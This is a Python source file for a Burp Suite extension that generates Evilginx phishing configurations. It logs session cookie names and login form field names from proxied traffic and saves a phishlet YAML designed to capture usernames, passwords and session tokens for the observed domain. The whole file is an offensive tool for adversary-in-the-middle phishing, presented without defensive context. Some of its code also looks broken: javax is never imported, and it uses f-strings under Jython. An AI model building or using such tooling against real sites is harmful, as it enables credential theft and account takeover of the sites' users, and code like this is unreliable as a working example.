from burp import IBurpExtender, IContextMenuFactory, IHttpListener
import yaml
import re
import os

class BurpExtender(IBurpExtender, IContextMenuFactory, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self.callbacks = callbacks
        self.helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Evilginx Phishlet Generator")
        callbacks.registerContextMenuFactory(self)
        callbacks.registerHttpListener(self)
        self.last_domain = None
        self.auth_tokens = []
        self.form_fields = {}
        
        # Configure phishlet save path
        self.phishlet_path = os.path.expanduser("~/evilginx/phishlets/")
        if not os.path.exists(self.phishlet_path):
            os.makedirs(self.phishlet_path)

    def createMenuItems(self, invocation):
        return [
            javax.swing.JMenuItem("Generate & Save Evilginx Phishlet", 
                actionPerformed=lambda e: self.generatePhishlet())
        ]

    def processHttpMessage(self, toolFlag, messageInfo):
        if messageInfo.getResponse():
            response = messageInfo.getResponse()
            analyzedResponse = self.helpers.analyzeResponse(response)
            
            headers = analyzedResponse.getHeaders()
            for header in headers:
                if header.lower().startswith("set-cookie:"):
                    cookie_name = re.search("set-cookie:\\s*([^=]+)=", header.lower())
                    if cookie_name and cookie_name.group(1) not in self.auth_tokens:
                        self.auth_tokens.append(cookie_name.group(1))

            body = response[analyzedResponse.getBodyOffset():].tostring()
            input_fields = re.findall('<input[^>]+name=["\']([^"\']+)["\']', body)
            for field in input_fields:
                if "pass" in field.lower():
                    self.form_fields["password"] = field
                elif "user" in field.lower() or "email" in field.lower():
                    self.form_fields["username"] = field

        self.last_domain = messageInfo.getHttpService().getHost()

    def generatePhishlet(self):
        if not self.last_domain:
            print("Error: No domain captured")
            return

        phishlet_data = {
            "min_ver": "3.0.0",
            "proxy_hosts": [{
                "phish_sub": "",
                "orig_sub": "",
                "domain": self.last_domain,
                "session": True,
                "is_landing": True
            }],
            "auth_tokens": [{
                "domain": f".{self.last_domain}",
                "keys": self.auth_tokens if self.auth_tokens else ["session", "token"]
            }],
            "credentials": {
                "username": {
                    "key": self.form_fields.get("username", "email"),
                    "search": "(.*)",
                    "type": "post"
                },
                "password": {
                    "key": self.form_fields.get("password", "password"),
                    "search": "(.*)",
                    "type": "post"
                }
            },
            "login": {
                "domain": self.last_domain,
                "path": "/login"
            }
        }

        try:
            # Save phishlet to evilginx phishlets directory
            filename = f"{self.last_domain}.yaml"
            filepath = os.path.join(self.phishlet_path, filename)
            
            with open(filepath, 'w') as f:
                yaml.dump(phishlet_data, f, default_flow_style=False)
            print(f"Phishlet saved to: {filepath}")
            
        except Exception as e:
            print(f"Error saving phishlet: {str(e)}")
